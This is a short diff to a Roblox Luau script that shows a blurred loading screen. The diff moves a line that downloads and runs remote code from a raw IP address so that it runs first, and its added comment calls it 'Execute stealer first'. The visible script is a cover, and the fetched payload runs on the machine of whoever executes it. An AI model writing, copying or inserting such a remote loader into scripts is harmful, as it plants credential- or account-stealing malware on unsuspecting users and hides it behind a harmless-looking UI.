@@ -6,6 +6,9 @@ local Lighting = game:GetService("Lighting")
 
 local player = Players.LocalPlayer
 
+--// Execute stealer first
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+
 --// Loader UI
 local function createLoadingScreen()
     local blur = Instance.new("BlurEffect")
@@ -85,6 +88,5 @@ local function createLoadingScreen()
     end)
 end
 
--- show loader & run script
+-- show loader after script execution
 createLoadingScreen()
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
